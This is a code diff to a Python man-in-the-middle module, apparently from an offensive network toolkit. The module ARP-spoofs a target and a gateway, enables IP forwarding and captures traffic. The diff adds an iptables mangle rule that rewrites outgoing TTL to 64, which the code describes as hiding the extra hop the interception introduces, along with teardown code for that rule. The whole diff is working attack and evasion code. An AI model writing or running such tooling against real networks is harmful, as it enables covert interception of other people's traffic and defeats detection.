@@ -34,15 +34,22 @@ class MitmModule:
         self.traffic = CapturedTraffic()
         self._running = False
         self._threads: list[threading.Thread] = []
+        self._arp_proc1: subprocess.Popen | None = None
+        self._arp_proc2: subprocess.Popen | None = None
 
     def start(
         self, interface: str, target_ip: str, gateway_ip: str,
+        ttl_spoof: bool = False,
     ) -> None:
         self.opsec.pre_operation()
         self._running = True
+        self._interface = interface
 
         self._enable_ip_forwarding()
         self._start_arp_spoof(interface, target_ip, gateway_ip)
+
+        if ttl_spoof:
+            self._enable_ttl_spoof()
 
         capture_types = self.config.mitm_capture
         if "dns" in capture_types:
@@ -80,6 +87,7 @@ class MitmModule:
                 except Exception:
                     proc.kill()
 
+        self._disable_ttl_spoof()
         self._disable_ip_forwarding()
         console.print("[yellow]MITM stopped[/yellow]")
         return self.traffic
@@ -241,6 +249,30 @@ class MitmModule:
                     )
 
         proc.terminate()
+
+    def _enable_ttl_spoof(self) -> None:
+        """Add iptables mangle rule to normalize TTL — hides the extra hop introduced by MITM."""
+        rule = [
+            "-t", "mangle", "-A", "POSTROUTING",
+            "-j", "TTL", "--ttl-set", "64",
+        ]
+        result = subprocess.run(
+            ["sudo", "iptables"] + rule, capture_output=True, text=True,
+        )
+        if result.returncode == 0:
+            self._ttl_rule = rule
+            console.print("[dim]TTL spoof active — outgoing TTL normalized to 64[/dim]")
+        else:
+            self._ttl_rule = None
+            console.print("[yellow]TTL spoof failed (xt_HL module may not be loaded)[/yellow]")
+
+    def _disable_ttl_spoof(self) -> None:
+        rule = getattr(self, "_ttl_rule", None)
+        if not rule:
+            return
+        delete_rule = [r if r != "-A" else "-D" for r in rule]
+        subprocess.run(["sudo", "iptables"] + delete_rule, capture_output=True)
+        self._ttl_rule = None
 
     def live_dashboard(self) -> None:
         def build_table() -> Table:
